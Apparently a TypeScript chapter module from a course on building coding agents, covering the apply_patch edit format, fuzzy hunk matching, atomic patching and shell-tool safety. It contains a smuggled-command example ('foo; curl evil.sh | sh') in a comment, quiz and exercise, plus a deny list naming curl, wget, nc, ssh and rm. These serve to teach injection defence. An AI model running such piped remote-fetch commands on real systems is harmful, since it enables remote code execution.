import type { Chapter } from "../../src/types.ts";
import { code, fig, lab, note, table, p, ul, ol, ch } from "../../src/ui.ts";

const EDIT_SVG = `
<svg viewBox="0 0 700 300" width="100%" style="max-width:700px;display:block;margin:0 auto" role="img"
     aria-label="Four file-edit formats compared by what the model must get right">
  <text x="14" y="18" class="d-label">WHAT THE MODEL MUST GET RIGHT — AND WHAT IT GETS WRONG</text>

  <rect x="14" y="30" width="672" height="50" rx="6" class="d-box" stroke="var(--danger)"/>
  <text x="28" y="50" class="d-text" fill="var(--danger)">whole-file rewrite</text>
  <text x="28" y="68" class="d-mono" fill="var(--fg-faint)">reproduces every unchanged line · drops code silently · costs the whole file in output</text>

  <rect x="14" y="86" width="672" height="50" rx="6" class="d-box" stroke="var(--danger)"/>
  <text x="28" y="106" class="d-text" fill="var(--danger)">unified diff with line numbers</text>
  <text x="28" y="124" class="d-mono" fill="var(--fg-faint)">must compute @@ -12,7 +12,9 @@ · models cannot count · one bad hunk shifts the rest</text>

  <rect x="14" y="142" width="672" height="50" rx="6" class="d-box" stroke="var(--warn)"/>
  <text x="28" y="162" class="d-text">JSON { old_string, new_string }</text>
  <text x="28" y="180" class="d-mono" fill="var(--fg-faint)">must JSON-escape multi-line code · quotes, backslashes, newlines · breaks on regexes</text>

  <rect x="14" y="198" width="672" height="50" rx="6" class="d-box-a"/>
  <text x="28" y="218" class="d-text">line-oriented context patch (apply_patch)</text>
  <text x="28" y="236" class="d-mono" fill="var(--fg-faint)">reproduces a few CONTEXT lines verbatim · no counting, no escaping · located by content</text>

  <text x="14" y="278" class="d-mono" fill="var(--accent)">the winning format asks for the one thing a model is reliably good at: repeating text it can see.</text>
</svg>`;

const PATCH_EXAMPLE = `*** Begin Patch
*** Update File: src/auth/session.ts
@@ export class SessionStore {
   async get(id: string): Promise<Session | null> {
-    const raw = await this.redis.get(\`sess:\${id}\`);
-    return raw ? JSON.parse(raw) : null;
+    const raw = await this.redis.get(\`sess:\${id}\`);
+    if (!raw) return null;
+    const parsed = JSON.parse(raw) as Session;
+    if (parsed.expiresAt < Date.now()) {
+      await this.redis.del(\`sess:\${id}\`);
+      return null;
+    }
+    return parsed;
   }
*** Add File: src/auth/expiry.test.ts
+import { test } from "node:test";
+import assert from "node:assert";
+
+test("expired sessions return null", async () => {
+  // …
+});
*** Delete File: src/auth/legacy-session.ts
*** End Patch`;

const chapter: Chapter = {
  id: "c14",
  num: 14,
  layer: "environment",
  title: "Files, Shell & Editing",
  subtitle: "The patch format is the interface, and it decides whether the agent works",
  blurb:
    "Coding agents live or die on how they edit files. Why line-numbered diffs and JSON string edits both fail, how Codex's apply_patch format works, and the filesystem and shell tools that surround it.",
  lines: 387,
  file: "code/c14_apply_patch.ts",
  tags: ["apply_patch", "file editing", "diff format", "fuzzy matching", "shell tools", "ripgrep", "filesystem"],

  sections: [
    { id: "motivation", kicker: "Motivation", title: "The hardest easy problem",
      html:
        p(`"Change this function" sounds trivial. It is the single most consequential interface decision in a coding agent, and getting it wrong caps everything else: an agent that fails 15% of its edits cannot complete a ten-edit refactor, no matter how good its reasoning is (${ch("c02", "C02")}'s compounding again).`) +
        p(`Four formats have been tried at scale. Three of them ask the model to do something it is measurably bad at.`) +
        fig({ label: "Diagram", title: "four formats, by what they demand", body: EDIT_SVG,
          caption: `The last row wins because it asks only for verbatim repetition of text the model is already looking at, and asks nothing of arithmetic or escaping.` }) +
        note("key", "The design principle", p(`Ask the model for the thing it is best at: <strong>reproducing text it can see</strong>. Do not ask it to count lines, compute offsets, or escape a multi-line code fragment into a JSON string. Every failure mode of the first three formats is a violation of that rule.`)) },

    { id: "core-idea", kicker: "Core idea", title: "The apply_patch envelope",
      html:
        p(`OpenAI's Codex uses a purpose-built line-oriented format. It is worth studying literally, because every element of it is a response to a specific failure.`) +
        code({ title: "one patch, three operations", lang: "text", plain: true, src: PATCH_EXAMPLE }) +
        `<h3>The grammar</h3>` +
        table(["Marker", "Meaning"], [
          ["<code>*** Begin Patch</code>", "Start sentinel. Unambiguous boundary — the model may write prose around it"],
          ["<code>*** Update File: {path}</code>", "Modify an existing file; hunks follow"],
          ["<code>*** Add File: {path}</code>", "Create a file; every following line is prefixed <code>+</code>"],
          ["<code>*** Delete File: {path}</code>", "Remove a file; no body"],
          ["<code>*** Move to: {path}</code>", "Optional, after an Update File line — write to the new path and delete the old"],
          ["<code>@@ {context}</code>", "Hunk header. The text after <code>@@</code> is a <em>locator</em>, not a line range"],
          ["<code>&nbsp;</code> (space)", "Context line — must match the file"],
          ["<code>-</code>", "Line to remove"],
          ["<code>+</code>", "Line to add"],
          ["<code>*** End of File</code>", "Marks a hunk that appends at EOF"],
          ["<code>*** End Patch</code>", "End sentinel"],
        ]) +
        p(`The important departure from unified diff is the <code>@@</code> line. A real diff writes <code>@@ -12,7 +12,9 @@</code> — line numbers and counts, which the model must compute and which shift as earlier hunks apply. Here, <code>@@</code> carries an optional <em>context string</em> such as a class or function signature, and location is determined by <strong>matching the context lines against the file</strong>. Nothing counts. Nothing shifts.`) +
        `<h3>Why each choice is there</h3>` +
        ul([
          `<strong>Sentinels rather than fences.</strong> Markdown fences appear inside the code being edited; <code>*** Begin Patch</code> does not. The parser can find the boundary even when the model wraps the patch in explanation.`,
          `<strong>Content-addressed hunks.</strong> Removing the line-number arithmetic removes the dominant failure mode of diff-based editing. A model that miscounts by one produces an unapplied patch; a model that reproduces three context lines produces a locatable one.`,
          `<strong>One operation per file, several files per patch.</strong> A refactor that touches four files is one atomic action — all or nothing — which matters enormously for recovery (${ch("c08", "C08")}) and for review.`,
          `<strong>No escaping anywhere.</strong> The body is lines. Quotes, backslashes, template literals, regexes and embedded JSON all pass through untouched. This is the failure that makes JSON-based edit tools break on exactly the code that is hardest to write by hand.`,
        ]) +
        note("", "Explicit invocation matters", p(`Codex treats a patch that appears without an explicit <code>apply_patch</code> call as an error rather than applying it. That is a deliberate safety property: patch text can appear in a file the agent is reading, in a code review it is summarising, or in a document an attacker controls. Patches apply because a tool was called, never because text was recognised.`)) },

    { id: "mechanics", kicker: "Mechanics", title: "Locating a hunk, and failing well",
      html:
        p(`Applying a hunk is a search problem. The strategy that works is a ladder of increasingly forgiving matches, where each rung is tried only if the one above fails.`) +
        code({ title: "code/c14_apply_patch.ts — the matching ladder",
          src: `function locate(lines: string[], context: string[], hint?: string): number | Failure {
  // Rung 0: if the @@ header named a context (a function or class signature),
  // start searching from there. Cuts false positives in files with repetition.
  const from = hint ? Math.max(0, lines.findIndex((l) => l.includes(hint))) : 0;

  // Rung 1: exact match. The overwhelming majority of hunks land here.
  const exact = findAll(lines, context, from, (a, b) => a === b);
  if (exact.length === 1) return exact[0];
  if (exact.length > 1) return { kind: "ambiguous", at: exact };

  // Rung 2: ignore trailing whitespace. Models normalise it constantly.
  const trimmedEnd = findAll(lines, context, from, (a, b) => a.trimEnd() === b.trimEnd());
  if (trimmedEnd.length === 1) return trimmedEnd[0];

  // Rung 3: ignore all leading/trailing whitespace. Indentation is re-derived on apply.
  const trimmed = findAll(lines, context, from, (a, b) => a.trim() === b.trim());
  if (trimmed.length === 1) return trimmed[0];

  // Rung 4: normalise punctuation the model may have "helpfully" typographed —
  // en dash → hyphen, curly quotes → straight, non-breaking hyphen → hyphen.
  // Codex does exactly this, and it catches a real and otherwise baffling class.
  const punct = findAll(lines, context, from, (a, b) => normPunct(a.trim()) === normPunct(b.trim()));
  if (punct.length === 1) return punct[0];

  return { kind: "not_found", context, nearest: closestWindow(lines, context) };
}`,
        }) +
        p(`Rung 4 deserves a note. Models occasionally emit a typographic dash or a curly quote where the file has an ASCII one, and the resulting failure is genuinely mystifying to debug, because the patch looks identical on screen. Normalising a small set of confusable characters removes it.`) +
        `<h3>Indentation must be re-derived, not copied</h3>` +
        code({ title: "the subtlety that makes trimmed matching safe",
          src: `function applyHunk(lines: string[], hunk: Hunk, at: number): string[] {
  // If we matched with trimmed comparison, the file's real indentation may differ
  // from the patch's. Compute the delta from the first context line and re-apply it
  // to every inserted line, or the patch silently breaks Python and mangles the rest.
  const fileIndent = leadingWhitespace(lines[at]);
  const patchIndent = leadingWhitespace(hunk.lines.find((l) => l.kind !== "add")!.text);
  const delta = fileIndent.length - patchIndent.length;

  const out = hunk.lines
    .filter((l) => l.kind !== "remove")
    .map((l) => (delta > 0 ? fileIndent.slice(0, delta) + l.text : l.text.slice(-delta)));

  return [...lines.slice(0, at), ...out, ...lines.slice(at + hunk.contextLength)];
}`,
        }) +
        `<h3>Failure messages are the recovery path</h3>` +
        p(`Every failure is a ${ch("c03", "C03")} observation, and the quality of the message determines whether the agent fixes it in one step or three.`) +
        code({ title: "what the model gets back", lang: "text", plain: true,
          src: `apply_patch failed: hunk 2 of 3 did not match src/auth/session.ts

Your context:
      const raw = await this.redis.get(\`sess:\${id}\`);
      return raw ? JSON.parse(raw) : null;

Closest text in the file (lines 41–42):
      const raw = await this.redis.get(\`session:\${id}\`);
      return raw ? JSON.parse(raw) as Session : null;

Differences: "sess:" vs "session:", and the file has an "as Session" cast.

No changes were applied — the patch is atomic. Re-read the file around line 41 and
send a corrected patch.`,
        }) +
        p(`Three properties. It names <em>which</em> hunk. It shows the actual file text beside the attempted context, so the model can see the drift rather than guess at it. And it states that nothing was applied, which prevents the agent from building its next patch on a file state that does not exist.`) +
        note("good", "Atomicity is not optional", p(`Apply the whole patch or none of it. A half-applied multi-file patch leaves the repository in a state neither you nor the agent has a model of, and the agent's next patch will be computed against the wrong contents. Validate every hunk against every file first, then write.`)) },

    { id: "explore", kicker: "Explore", title: "Race four edit formats",
      html:
        p(`Each format has characteristic failure modes. Set the file's properties and see which format survives.`) +
        lab({ label: "Simulator", title: "edit format reliability",
          body: `
<div class="controls">
  <div class="ctl"><label>file size</label><input type="range" id="p14-size" min="20" max="2000" step="20" value="400"><span class="val" id="p14-size-v">400 lines</span></div>
  <div class="ctl"><label>edits in this task</label><input type="range" id="p14-n" min="1" max="20" step="1" value="8"><span class="val" id="p14-n-v">8</span></div>
  <div class="ctl"><label>code contains quotes/regex/templates</label><select id="p14-q"><option value="0">rarely</option><option value="1" selected>often</option></select></div>
  <div class="ctl"><label>repeated similar blocks</label><select id="p14-r"><option value="0" selected>few</option><option value="1">many (boilerplate)</option></select></div>
  <div class="ctl"><label>fuzzy matching ladder</label><select id="p14-f"><option value="0">exact only</option><option value="1" selected>full ladder</option></select></div>
</div>
<div id="p14-rows" style="margin-top:.5rem"></div>
<div class="stats">
  <div class="stat"><b id="p14-tok">—</b><span>output tokens / edit</span></div>
  <div class="stat"><b id="p14-amb">—</b><span>ambiguous-location rate</span></div>
</div>
<div class="note" id="p14-note" style="margin-top:1rem"></div>`,
          script: `
function upd() {
  var size = +document.getElementById("p14-size").value, N = +document.getElementById("p14-n").value,
      quotes = document.getElementById("p14-q").value === "1", rep = document.getElementById("p14-r").value === "1",
      fuzzy = document.getElementById("p14-f").value === "1";
  document.getElementById("p14-size-v").textContent = size + " lines";
  document.getElementById("p14-n-v").textContent = N;

  // per-edit success rates
  var whole = Math.max(.35, .97 - (size / 2000) * .55);              // drops lines in big files
  var lineDiff = Math.max(.30, .86 - (size / 2000) * .30) * (fuzzy ? 1 : .82);  // counting errors
  var json = (quotes ? .82 : .95) * (fuzzy ? 1 : .97);               // escaping failures
  var patch = (fuzzy ? .985 : .90) * (rep ? .96 : 1);                // ambiguity when repetitive

  var rows = [
    ["whole-file rewrite", whole, Math.round(size * 9)],
    ["unified diff (line numbers)", lineDiff, 140],
    ["JSON old/new string", json, 190],
    ["apply_patch (context)", patch, 160]
  ];
  document.getElementById("p14-rows").innerHTML = rows.map(function (r) {
    var task = Math.pow(r[1], N);
    var col = task > .85 ? "var(--ok)" : task > .5 ? "var(--accent)" : "var(--danger)";
    return '<div style="display:flex;gap:.6rem;align-items:center;margin:.35rem 0">' +
      '<span class="mono small" style="width:14rem;color:var(--fg-muted)">' + r[0] + '</span>' +
      '<span class="meter" style="flex:1"><i style="width:' + (task * 100) + '%;background:' + col + '"></i></span>' +
      '<span class="mono small" style="width:9rem;text-align:right">' + Math.round(r[1] * 1000) / 10 + '%/edit → ' + Math.round(task * 100) + '% task</span></div>';
  }).join("");
  document.getElementById("p14-tok").textContent = Math.round(size * 9).toLocaleString() + " vs 160";
  document.getElementById("p14-amb").textContent = rep ? (fuzzy ? "4%" : "11%") : "1%";

  var n = document.getElementById("p14-note");
  if (size > 900) n.innerHTML = "<b>Large file.</b> Whole-file rewrite collapses — the model drops or subtly alters lines it was supposed to copy verbatim, and every edit costs thousands of output tokens. This is why no serious coding agent rewrites files.";
  else if (quotes) n.innerHTML = "<b>Quote-heavy code.</b> The JSON format loses a measurable share to escaping: a regex containing backslashes, or a template literal with nested backticks, has to survive a round trip through a JSON string. The line-oriented format never escapes anything.";
  else if (!fuzzy) n.innerHTML = "<b>Exact matching only.</b> Trailing whitespace, re-indentation and a stray typographic dash each cost you edits. The ladder recovers them for about forty lines of code — and rung 4 catches the class that is otherwise impossible to debug.";
  else if (rep) n.innerHTML = "<b>Repetitive code.</b> Context matching gets ambiguous when twelve blocks look alike. The @@ locator line is the fix: naming the enclosing function narrows the search window before matching begins.";
  else n.innerHTML = "<b>The production configuration.</b> Context-addressed patches with a full matching ladder, ~160 output tokens per edit, and an 8-edit task completing over 88% of the time. Compare with the whole-file row's token count.";
}
["p14-size","p14-n","p14-q","p14-r","p14-f"].forEach(function (i) {
  document.getElementById(i).addEventListener("input", upd); document.getElementById(i).addEventListener("change", upd); });
upd();`,
          caption: `Push the file size to 1,500 lines. Whole-file rewriting falls apart, and note its output-token column. That is the cost of asking a model to copy code it was not changing.`,
        }) },

    { id: "build", kicker: "Build it", title: "The surrounding tool set",
      html:
        p(`<code>apply_patch</code> is one tool among five, and the others shape how well it is used.`) +
        code({ title: "code/c14_apply_patch.ts — the file tools",
          src: `// 1. READ — with line numbers, because the model will refer to them in conversation
//    even though the patch format does not need them.
const readFile = defineTool({
  name: "read_file", readOnly: true,
  description: \`Read a file, optionally a line range. Output is numbered for reference.
ALWAYS read a file before patching it — patches must match the current contents exactly.\`,
  input: obj({ path: str(), start: opt(int({ min: 1 })), end: opt(int({ min: 1 })) }),
  maxResultTokens: 6_000,
});

// 2. SEARCH — ripgrep, not embeddings. Developers search for identifiers, and
//    identifiers are exactly what lexical search finds and vectors do not (C06).
const grep = defineTool({
  name: "grep", readOnly: true,
  description: \`Regex search across the repository. Respects .gitignore.
Returns path:line:text with N lines of context.\`,
  input: obj({ pattern: str(), glob: opt(str()), contextLines: opt(int({ max: 10 })) }),
});

// 3. LIST — a bounded tree, never a recursive dump of node_modules.
const listFiles = defineTool({ name: "list_files", readOnly: true,
  input: obj({ dir: str(), depth: opt(int({ max: 3 })) }) });

// 4. PATCH — the only way to change a file.
const applyPatch = defineTool({
  name: "apply_patch", readOnly: false, idempotent: false,
  description: \`Apply a patch in the *** Begin Patch / *** End Patch format.
Supports Update File, Add File, Delete File, and Move to.
Hunks are located by matching their context lines — do NOT use line numbers.
The whole patch applies atomically: if any hunk fails, nothing is written.\`,
  input: obj({ patch: str(), why: str() }),
});

// 5. SHELL — the escape hatch, and the one that needs C16's approval layer.
const shell = defineTool({ name: "shell", readOnly: false,
  input: obj({ command: arr(str()), cwd: opt(str()), timeoutMs: opt(int()) }) });`,
        }) +
        `<h3>The shell tool, and the argv rule</h3>` +
        code({ title: "no shell interpolation, ever",
          src: `// ✗ A single string means the shell parses it, and the model controls the string.
//   \`rm -rf \${dir}\` where dir is "foo; curl evil.sh | sh"
exec(\`git commit -m "\${message}"\`);

// ✓ An argv array means no shell, no globbing, no injection surface.
spawn("git", ["commit", "-m", message], { cwd, timeout, env: SAFE_ENV });`,
        }) +
        p(`Taking <code>command</code> as <code>string[]</code> rather than <code>string</code> removes shell injection structurally. The cost is that the model cannot use pipes and redirects, which is a feature, since those are also the constructs that make a command hard to review.`) +
        `<h3>Guardrails the model cannot argue with</h3>` +
        code({ title: "policy in code",
          src: `const DENY = [
  /^rm$/,                                  // use the patch tool's Delete File
  /^(sudo|su|chown|chmod)$/,
  /^(curl|wget|nc|ssh|scp)$/,              // egress belongs to an allowlisted proxy
  /^git$/ /* only with an allowlisted subcommand */,
];
const GIT_ALLOW = new Set(["status", "diff", "log", "show", "add", "commit", "branch", "stash"]);

function checkCommand(argv: string[], cwd: string, roots: string[]): PolicyResult {
  if (!withinRoots(cwd, roots)) return deny(\`cwd \${cwd} is outside the workspace\`);
  if (argv[0] === "git" && !GIT_ALLOW.has(argv[1])) return ask(\`git \${argv[1]} needs approval\`);
  if (DENY.some((re) => re.test(argv[0]))) return deny(\`\${argv[0]} is not available; \` + remedyFor(argv[0]));
  if (argv.some((a) => a.includes(".."))) return deny("path traversal");
  return allow();
}
// deny() returns an observation naming the alternative. ask() routes to C16.`,
        }) +
        code({ title: "run it", lang: "bash", plain: true,
          src: `node --experimental-strip-types code/c14_apply_patch.ts

#   C14 · apply_patch
#
#   ✓ exact context match            applied  [exact]
#   ✓ trailing whitespace differs    applied  [trimEnd]
#   ✓ typographic dash (rung 4)      applied  [punct]
#   ✓ add + delete + move, one patch applied  []
#   ✗ ambiguous context              refused
#       apply_patch failed: hunk 1 of src/dup.ts did not apply.
#
#       Its context matches 2 places:
#   ✗ context not found              refused
#       apply_patch failed: hunk 1 of src/session.ts did not apply.
#
#       Your context:
#
#   the message an agent gets back on an ambiguous hunk:
#
#     apply_patch failed: hunk 1 of src/dup.ts did not apply.
#
#     Its context matches 2 places:
#       line 2  (inside function a() {)
#           return null;
#
#       line 5  (inside function b() {)
#           return null;
#
#     Nothing was applied. Add more surrounding context lines so the match is unique, or set the @@ header to the enclosing function or class, e.g.
#       @@ function a() {
#
#   atomicity: a patch whose SECOND hunk fails writes nothing
#
#     result: refused · files written: 0
#     src/session.ts unchanged: true`,
        }) },

    { id: "production", kicker: "Production notes", title: "Field notes",
      html:
        ul([
          `<strong>Read Codex's <code>apply_patch</code> implementation.</strong> It is a compact, well-commented parser with exactly the error variants this chapter describes — an invalid-patch error, a per-hunk error carrying a line number, and a guard against patches that appear without an explicit tool call. It is one of the clearest pieces of agent infrastructure in the open.`,
          `<strong>Claude Code uses a string-replacement edit tool</strong> with a uniqueness requirement — the old string must appear exactly once, and the tool errors out if it does not. Different mechanism, same principle: locate by content, refuse ambiguity, never trust line numbers.`,
          `<strong>Always require a read before a patch.</strong> An agent patching from memory of a file it read eight turns ago will fail against a file something else has modified. Track per-file read timestamps and refuse a patch against a file that changed since — with a message saying so.`,
          `<strong>Do not let the agent commit without being asked.</strong> Git history is a shared artefact, and an agent that commits eagerly produces a history nobody wants to read. Stage, show the diff, and let a human decide (${ch("c16", "C16")}).`,
          `<strong>Respect <code>.gitignore</code> everywhere.</strong> An agent that greps <code>node_modules</code> or reads a <code>.env</code> it should not have seen wastes context in the best case and leaks secrets in the worst.`,
        ]) },
  ],

  exercises: [
    { difficulty: "warm-up",
      prompt: `Why can a model not reliably produce <code>@@ -12,7 +12,9 @@</code>?`,
      answer: p(`Because it requires counting, and counting over long spans is a known weakness. Four separate numbers must be right: the start line of the original, its length, the start of the result, and its length, and the last two depend on arithmetic over the additions and deletions within the hunk.`) +
        p(`It is also fragile in a way that compounds: in a multi-hunk patch, every hunk after the first depends on the cumulative line delta of the preceding ones. One miscount and the rest of the patch is wrong too. Context matching has no such coupling. Each hunk is located independently by what it says, so a bad hunk fails alone.`) },

    { difficulty: "core",
      prompt: `Implement the ambiguity case: a patch's context appears three times in the file. What should happen, and what should the message say?`,
      answer: code({ title: "refuse, and make the disambiguation obvious",
        src: `if (matches.length > 1) {
  return {
    ok: false,
    message:
      \`apply_patch failed: the context for hunk \${i + 1} matches \${matches.length} places in \${path}.\\n\\n\` +
      matches.map((m) => \`  line \${m + 1}:  (inside \${enclosingSymbol(lines, m) ?? "top level"})\\n\` +
        lines.slice(m, m + 3).map((l) => \`    \${l}\`).join("\\n")).join("\\n\\n") +
      \`\\n\\nNothing was applied. Either add more surrounding context lines so the match is \` +
      \`unique, or set the @@ header to the enclosing function or class, e.g.\\n\` +
      \`  @@ \${enclosingSymbol(lines, matches[0]) ?? "class Foo"}\`,
  };
}` }) +
      ul([
        `<strong>Never pick one.</strong> Choosing the first match will eventually edit the wrong copy of duplicated boilerplate, and that bug is silent: the patch "succeeds" and the wrong function changes.`,
        `<strong>Show each candidate with its enclosing symbol.</strong> The enclosing function name is what the model needs to write a correct <code>@@</code> header, so compute it for them rather than making them re-read the file.`,
        `<strong>Name both remedies.</strong> More context lines, or an <code>@@</code> locator. Without the second, the model will keep adding context lines to a block that is genuinely identical in all three places.`,
      ]) },

    { difficulty: "core",
      prompt: `Design the staleness check that prevents patching a file the agent has not read recently. What counts as "stale", and what is the message?`,
      answer: code({ title: "content hash, not timestamp",
        src: `class FileTracker {
  private seen = new Map<string, { hash: string; at: number; turn: number }>();

  record(path: string, content: string, turn: number): void {
    this.seen.set(path, { hash: sha1(content), at: Date.now(), turn });
  }

  async check(path: string, currentTurn: number): Promise<string | null> {
    const prior = this.seen.get(path);
    if (!prior) return \`You have not read \${path} in this session. Read it before patching.\`;

    const now = sha1(await readFile(path, "utf8"));
    if (now !== prior.hash) {
      return \`\${path} has changed since you read it at step \${prior.turn} \` +
             \`(another process, a build step, or your own earlier patch). \` +
             \`Re-read it and rebuild the patch against the current contents.\`;
    }
    return null;
  }
}` }) +
      ul([
        `<strong>Hash, not mtime.</strong> A build tool can touch a file without changing it, and a timestamp check then blocks legitimate patches. Content is what the patch matches against, so content is what should gate it.`,
        `<strong>Turn distance alone is not staleness.</strong> Reading a file at step 2 and patching at step 20 is fine if nothing changed. The check is "has it changed", not "was it long ago".`,
        `<strong>The agent's own patches must update the tracker</strong>, or the second patch to a file always fails. Record the post-patch content on every successful apply.`,
        `<strong>Name the likely cause in the message.</strong> "Another process, a build step, or your own earlier patch" tells the model what kind of re-read to do — a full re-read rather than a targeted one.`,
      ]) },

    { difficulty: "stretch",
      prompt: `Your agent must rename a symbol used in 40 files. Compare three strategies and pick one, accounting for cost, correctness and reviewability.`,
      answer: table(["Strategy", "Cost", "Correctness", "Reviewability"], [
        ["<b>40 individual patches</b>", "High — 40 read/patch cycles, ~25k tokens", "Good, if each read succeeds", "Excellent: one atomic patch per file, reviewable individually"],
        ["<b>One shell sed across the tree</b>", "Trivial — one call", "<b>Poor</b>: matches substrings, comments, strings, unrelated symbols with the same name", "Poor: one opaque command, effects invisible until reviewed"],
        ["<b>Language-aware rename tool</b>", "Low — one call", "<b>Best</b>: the type checker knows what a reference is", "Good: produces a real diff you can read"],
      ]) +
      p(`<strong>Pick the language-aware tool if one exists</strong> — <code>tsc</code>'s rename, <code>gopls</code>, <code>rust-analyzer</code>, an LSP <code>textDocument/rename</code>. It is the only option that distinguishes a reference from a coincidentally identical string in a comment, and coding agents should expose the language server as a tool for exactly this class of task.`) +
      p(`If there is no such tool, the honest answer is a <strong>hybrid</strong>: use <code>grep</code> to enumerate the sites, patch the files where the change is mechanical, and hand-examine the handful where the symbol appears in a string, a comment, or a dynamic lookup. That is roughly what a careful human does, and it keeps the reviewable-diff property that <code>sed</code> throws away.`) +
      p(`One practical note: forty patches is forty chances to be interrupted. Run them as a single logical operation with the event log from ${ch("c08", "C08")}, so a crash at file 23 is resumable rather than leaving the repository half-renamed and uncompilable.`) },
  ],

  qa: [
    { q: "Should I just use `git apply` with a real unified diff?", a: p(`You can, and some agents do, but you inherit the line-number problem, and <code>git apply</code> is strict about context by default. The fallback is <code>--3way</code> or <code>patch --fuzz</code>, which reintroduces the ambiguity risk without the good error messages. A purpose-built format with a matching ladder and messages written for a model to read is worth the 300 lines.`) },
    { q: "How many context lines should a hunk carry?", a: p(`Three above and three below is the conventional default and works well. More context means fewer ambiguous matches and more chances to reproduce a line slightly wrong; fewer means the opposite. Three is a good balance, and the <code>@@</code> locator is the right tool for genuine ambiguity rather than piling on context.`) },
    { q: "Should the agent be able to delete files?", a: p(`Through <code>*** Delete File:</code> in a patch, yes: it is visible, atomic and reviewable. Through <code>rm</code> in the shell, no. The difference is that a patch shows up in the diff a human approves, and a shell command does not.`) },
    { q: "What about binary files and notebooks?", a: p(`Neither works with a line format. Binaries need a dedicated tool or should be out of scope. Notebooks need a cell-level tool that edits the JSON structurally. Patching <code>.ipynb</code> as text is a reliable way to corrupt a notebook, because the output blobs and execution counts are part of the file.`) },
    { q: "Can the agent run the tests itself?", a: p(`Yes, and it should. That is ${ch("c10", "C10")}'s ground truth, and it is the single largest reason coding agents work. Run it through the argv-array shell tool with a generous timeout and a capped output, and make passing tests a precondition for finishing.`) },
  ],

  project: {
    title: "Project · A patch tool with a fuzz ladder",
    brief: p(`Implement the <code>apply_patch</code> format end to end — parser, matcher, applier — and prove it on a real repository. This is the highest-value single component in a coding agent.`),
    spec: [
      "A parser for the full grammar: Begin/End Patch, Update/Add/Delete File, Move to, <code>@@</code> locators, End of File, and the three line prefixes.",
      "The matching ladder: exact, trailing-whitespace-insensitive, fully trimmed, punctuation-normalised — with <code>@@</code> narrowing the search window first.",
      "Indentation re-derived from the matched file text, not copied from the patch.",
      "Atomic application across all files: validate every hunk first, write nothing on any failure.",
      "Ambiguity refused, with every candidate shown alongside its enclosing symbol and both remedies named.",
      "Failure messages that show the attempted context beside the actual file text and state that nothing was applied.",
      "A staleness check by content hash, updated on every successful apply.",
      "A test suite of at least 30 patches against a fixture repository, including deliberate failures, reporting which ladder rung resolved each one.",
    ],
    stretch: [
      "Add the surrounding tools — read with line numbers, ripgrep-backed search, bounded list — and wire them to your agent.",
      "Add an argv-array shell tool with the deny list and workspace-root check, and a test proving <code>foo; curl evil | sh</code> cannot execute.",
      "Measure it: give your agent ten real refactoring tasks and report edits attempted, first-try success rate, and which rung saved the recoveries.",
    ],
  },

  quiz: [
    { q: "Why does apply_patch locate hunks by context rather than line numbers?",
      options: ["Models cannot reliably count lines, and in a multi-hunk patch every later hunk depends on the deltas of earlier ones", "Line numbers are not available in the tool input", "Context lines compress better", "Line numbers break prompt caching"],
      answer: 0,
      why: "Unified diff requires four computed numbers per hunk plus cumulative offsets. Context matching asks the model only to reproduce text it can see, and each hunk is located independently, so one bad hunk fails alone." },
    { q: "What does the format avoid by being line-oriented rather than JSON?",
      options: ["Escaping — quotes, backslashes, newlines and template literals pass through untouched", "The need for a schema", "Tool-call overhead", "The need to read the file first"],
      answer: 0,
      why: "JSON-encoding a multi-line code fragment means escaping exactly the characters that appear most in hard-to-write code: regexes, template literals, embedded JSON. That is where JSON edit tools fail, and where they fail worst." },
    { q: "A patch's context matches three places in the file. What should the tool do?",
      options: ["Refuse, show all three candidates with their enclosing symbols, and name both remedies", "Apply to the first match", "Apply to all three", "Apply to the match nearest the top of the file"],
      answer: 0,
      why: "Picking one edits the wrong copy of duplicated boilerplate and does so silently: the patch 'succeeds'. Refusing with candidates and enclosing symbols lets the model write a correct @@ locator in one step." },
    { q: "Why must a multi-file patch be atomic?",
      options: ["A half-applied patch leaves the repository in a state neither you nor the agent models, so the next patch is computed against wrong contents", "Filesystems do not support partial writes", "It reduces token usage", "Git requires it"],
      answer: 0,
      why: "The agent's subsequent patches match against its belief about file contents. A partial application desynchronises that belief, and the resulting failures look like matching bugs rather than the state bug they are." },
    { q: "Why should the shell tool take `string[]` rather than a single command string?",
      options: ["No shell means no interpolation, globbing or injection surface — `foo; curl evil | sh` cannot execute", "It is easier for models to produce", "It allows longer commands", "It preserves argument order"],
      answer: 0,
      why: "A single string is parsed by a shell that the model controls the input to. An argv array removes the interpreter entirely. Losing pipes and redirects is a bonus: those are also what makes a command hard to review." },
    { q: "Why does Codex refuse to apply a patch that appears without an explicit tool call?",
      options: ["Patch text can appear inside files being read or documents an attacker controls; patches must apply because a tool was called", "It improves parsing performance", "It enforces the atomicity guarantee", "It keeps the patch out of the context window"],
      answer: 0,
      why: "Recognising patch text anywhere in the stream makes any document containing a patch into an instruction to modify the filesystem. Requiring an explicit invocation keeps the decision inside the tool layer, where C16's approvals apply." },
  ],

  continues: p(`Your agent now has its own tools: search, files, patches, a shell, a sandbox. Every other team is building the same tools against the same systems, and none of them compose. ${ch("c15", "C15")} is the protocol that makes a tool written once usable by any agent, and what it does and does not solve.`),
};

export default chapter;
